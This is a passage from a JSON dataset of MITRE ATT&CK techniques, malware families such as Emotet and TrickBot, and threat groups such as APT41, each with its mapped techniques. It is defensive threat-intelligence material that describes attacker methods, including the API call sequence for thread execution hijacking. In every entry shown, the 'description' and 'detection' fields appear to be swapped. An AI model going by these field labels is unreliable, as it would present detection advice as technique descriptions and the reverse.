                    "T1036": "Masquerading",
                    "T1016": "System Network Configuration Discovery",
                    "T0828": "Loss of Productivity and Revenue"
                }
            },
            "val": 20
        },
        {
            "id": "T1571",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Non-Standard Port",
                "chain_phase": "command-and-control",
                "description": "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1204.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Malicious Link",
                "chain_phase": "execution",
                "description": "Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.",
                "detection": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1087.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Email Account",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Office 365",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "S0367",
            "type": "tool",
            "attributes": {
                "name": "Emotet",
                "aliases": [
                    "Geodo"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Emotet is a modular malware variant which is primarily used as a downloader for other malware variants such as TrickBot and IcedID. Emotet first emerged in June 2014 and has been primarily used to target the banking sector.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1571": "Non-Standard Port",
                    "T1078.003": "Local Accounts",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.003": "Email Account",
                    "T1560": "Archive Collected Data",
                    "T1114.001": "Local Email Collection",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1003.001": "LSASS Memory",
                    "T1110.001": "Password Guessing",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1027.002": "Software Packing",
                    "T1552.001": "Credentials In Files",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1210": "Exploitation of Remote Services",
                    "T1094": "Custom Command and Control Protocol",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1040": "Network Sniffing",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 32
        },
        {
            "id": "S0359",
            "type": "tool",
            "attributes": {
                "name": "Nltest",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Nltest is a Windows command-line utility used to list domain controllers and enumerate domain trusts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1482": "Domain Trust Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "T1555.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Managers",
                "chain_phase": "credential-access",
                "description": "Consider monitoring API calls, file read events, and processes for suspicious activity that could indicate searching in process memory of password managers. \n\nConsider monitoring file reads surrounding known password manager applications.",
                "detection": "Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via Exploitation for Credential Access.\n Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1110.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credential Stuffing",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.",
                "detection": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1542.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Bootkit",
                "chain_phase": "persistence",
                "description": "Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.",
                "detection": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1495",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Firmware Corruption",
                "chain_phase": "impact",
                "description": "System firmware manipulation may be detected.(Citation: MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS and compare against known patching behavior.",
                "detection": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot. Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0266",
            "type": "tool",
            "attributes": {
                "name": "TrickBot",
                "aliases": [
                    "Totbrick",
                    "TSPY_TRICKLOAD"
                ],
                "labels": [
                    "malware"
                ],
                "description": "TrickBot is a Trojan spyware program that has mainly been used for targeting banking sites in United States, Canada, UK, Germany, Australia, Austria, Ireland, London, Switzerland, and Scotland. TrickBot first emerged in the wild in September 2016 and appears to be a successor to Dyre. TrickBot is developed in the C++ programming language.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1555.005": "Password Managers",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1571": "Non-Standard Port",
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.003": "Email Account",
                    "T1087.001": "Local Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1559.001": "Component Object Model",
                    "T1056.004": "Credential API Hooking",
                    "T1110.004": "Credential Stuffing",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1552.002": "Credentials in Registry",
                    "T1552.001": "Credentials In Files",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.012": "Process Hollowing",
                    "T1542.003": "Bootkit",
                    "T1053.005": "Scheduled Task",
                    "T1495": "Firmware Corruption",
                    "T1482": "Domain Trust Discovery",
                    "T1210": "Exploitation of Remote Services",
                    "T1219": "Remote Access Software",
                    "T1185": "Man in the Browser",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1069": "Permission Groups Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1036": "Masquerading",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1008": "Fallback Channels",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 50
        },
        {
            "id": "S0097",
            "type": "tool",
            "attributes": {
                "name": "Ping",
                "aliases": [
                    "ping.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "Ping is an operating system utility commonly used to troubleshoot and verify network connections.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1018": "Remote System Discovery"
                }
            },
            "val": 1
        },
        {
            "id": "S0024",
            "type": "tool",
            "attributes": {
                "name": "Dyre",
                "aliases": [
                    "Dyzap",
                    "Dyreza"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Dyre is a banking Trojan that has been used for financial gain.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1497.001": "System Checks",
                    "T1027.002": "Software Packing",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1518": "Software Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1055": "Process Injection",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "G0101",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Frankenstein",
                "aliases": [],
                "description": "Frankenstein is a campaign carried out between January and April 2019 by unknown threat actors. The campaign name comes from the actors' ability to piece together several unrelated components.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0363": "Empire"
                },
                "techniques": {
                    "T1127.001": "MSBuild",
                    "T1573.001": "Symmetric Cryptography",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1497.001": "System Checks",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1053.005": "Scheduled Task",
                    "T1221": "Template Injection",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1119": "Automated Collection",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System",
                    "T1003": "OS Credential Dumping"
                }
            }
        },
        {
            "id": "G0100",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "Inception",
                "aliases": [
                    "Inception Framework",
                    "Cloud Atlas"
                ],
                "description": "Inception is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0442": "VBShower",
                    "S0441": "PowerShower",
                    "S0349": "LaZagne"
                },
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1090.003": "Multi-hop Proxy",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1069.002": "Domain Groups",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.010": "Regsvr32",
                    "T1218.005": "Mshta",
                    "T1518": "Software Discovery",
                    "T1221": "Template Injection",
                    "T1203": "Exploitation for Client Execution",
                    "T1102": "Web Service",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0442",
            "type": "tool",
            "attributes": {
                "name": "VBShower",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "VBShower is a backdoor that has been used by Inception since at least 2019. VBShower has been used as a downloader for second stage payloads, including PowerShower.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.005": "Visual Basic",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 5
        },
        {
            "id": "S0441",
            "type": "tool",
            "attributes": {
                "name": "PowerShower",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PowerShower is a PowerShell backdoor used by Inception for initial reconnaissance and to download and execute second stage payloads.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1564.003": "Hidden Window",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1560.001": "Archive via Utility",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1112": "Modify Registry",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "G0099",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "APT-C-36",
                "aliases": [
                    "Blind Eagle"
                ],
                "description": "APT-C-36 is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0434": "Imminent Monitor"
                },
                "techniques": {
                    "T1571": "Non-Standard Port",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1566.001": "Spearphishing Attachment",
                    "T1036.004": "Masquerade Task or Service",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "T1496",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Resource Hijacking",
                "chain_phase": "impact",
                "description": "Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.",
                "detection": "Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.\n\nAdditionally, some cryptocurrency mining malware kills off processes for competing malware to ensure it’s not competing for resources.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0434",
            "type": "tool",
            "attributes": {
                "name": "Imminent Monitor",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Imminent Monitor was a commodity remote access tool (RAT) offered for sale from 2012 until 2019, when an operation was conducted to take down the Imminent Monitor infrastructure. Various cracked versions and variations of this RAT are still in circulation.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.001": "Hidden Files and Directories",
                    "T1562.001": "Disable or Modify Tools",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1496": "Resource Hijacking",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1106": "Native API",
                    "T1083": "File and Directory Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 16
        },
        {
            "id": "G0098",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "BlackTech",
                "aliases": [],
                "description": "BlackTech is a cyber espionage group operating against targets in East Asia, particularly Taiwan, and occasionally, Japan and Hong Kong.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0579": "Waterbear",
                    "S0437": "Kivars",
                    "S0436": "TSCookie",
                    "S0435": "PLEAD"
                },
                "techniques": {
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1036.002": "Right-to-Left Override",
                    "T1190": "Exploit Public-Facing Application",
                    "T1203": "Exploitation for Client Execution"
                }
            }
        },
        {
            "id": "T1055.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Thread Execution Hijacking",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0579",
            "type": "tool",
            "attributes": {
                "name": "Waterbear",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Waterbear is modular malware attributed to BlackTech that has been used primarily for lateral movement, decrypting, and triggering payloads and is capable of hiding network behaviors.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1027.005": "Indicator Removal from Tools",
                    "T1562.006": "Indicator Blocking",
                    "T1574.002": "DLL Side-Loading",
                    "T1518.001": "Security Software Discovery",
                    "T1055.003": "Thread Execution Hijacking",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry"
                }
            },
            "val": 13
        },
        {
            "id": "T1021",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote Services",
                "chain_phase": "lateral-movement",
                "description": "Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement.",
                "detection": "Adversaries may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0437",
            "type": "tool",
            "attributes": {
                "name": "Kivars",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Kivars is a modular remote access tool (RAT), derived from the Bifrost RAT, that was used by BlackTech in a 2010 campaign.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.003": "Hidden Window",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1021": "Remote Services"
                }
            },
            "val": 7
        },
        {
            "id": "S0436",
            "type": "tool",
            "attributes": {
                "name": "TSCookie",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TSCookie is a remote access tool (RAT) that has been used by BlackTech in campaigns against Japanese targets.. TSCookie has been referred to as PLEAD though more recent reporting indicates a separation between the two.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1204.001": "Malicious Link",
                    "T1059.003": "Windows Command Shell",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 13
        },
        {
            "id": "T1001.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Junk Data",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0435",
            "type": "tool",
            "attributes": {
                "name": "PLEAD",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PLEAD is a remote access tool (RAT) and downloader used by BlackTech in targeted attacks in East Asia including Taiwan, Japan, and Hong Kong. PLEAD has also been referred to as TSCookie, though more recent reporting indicates likely separation between the two.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1001.001": "Junk Data",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.003": "Windows Command Shell",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555": "Credentials from Password Stores",
                    "T1070.004": "File Deletion",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "G0096",
            "type": "group",
            "attributes": {
                "val": 23,
                "name": "APT41",
                "aliases": [
                    "WICKED PANDA"
                ],
                "description": "APT41 is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. APT41 has been active since as early as 2012. The group has been observed targeting healthcare, telecom, technology, and video game industries in 14 countries.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0596": "ShadowPad",
                    "S0443": "MESSAGETAP",
                    "S0430": "Winnti for Linux",
                    "S0412": "ZxShell",
                    "S0385": "njRAT",
                    "S0363": "Empire",
                    "S0194": "PowerSploit",
                    "S0190": "BITSAdmin",
                    "S0160": "certutil",
                    "S0154": "Cobalt Strike",
                    "S0112": "ROCKBOOT",
                    "S0104": "netstat",
                    "S0097": "Ping",
                    "S0095": "FTP",
                    "S0073": "ASPXSpy",
                    "S0069": "BLACKCOFFEE",
                    "S0039": "Net",
                    "S0032": "gh0st RAT",
                    "S0021": "Derusbi",
                    "S0020": "China Chopper",
                    "S0013": "PlugX",
                    "S0006": "pwdump",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1480.001": "Environmental Keying",
                    "T1071.004": "DNS",
                    "T1071.002": "File Transfer Protocols",
                    "T1071.001": "Web Protocols",
                    "T1102.001": "Dead Drop Resolver",
                    "T1574.006": "Dynamic Linker Hijacking",
                    "T1574.002": "DLL Side-Loading",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1569.002": "Service Execution",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1059.004": "Unix Shell",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1560.001": "Archive via Utility",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1110.002": "Password Cracking",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1070.003": "Clear Command History",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1136.001": "Local Account",
                    "T1546.008": "Accessibility Features",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.001": "Compiled HTML File",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1542.003": "Bootkit",
                    "T1053.005": "Scheduled Task",
                    "T1496": "Resource Hijacking",
                    "T1486": "Data Encrypted for Impact",
                    "T1190": "Exploit Public-Facing Application",
                    "T1197": "BITS Jobs",
                    "T1203": "Exploitation for Client Execution",
                    "T1135": "Network Share Discovery",
                    "T1133": "External Remote Services",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1104": "Multi-Stage Channels",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1078": "Valid Accounts",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
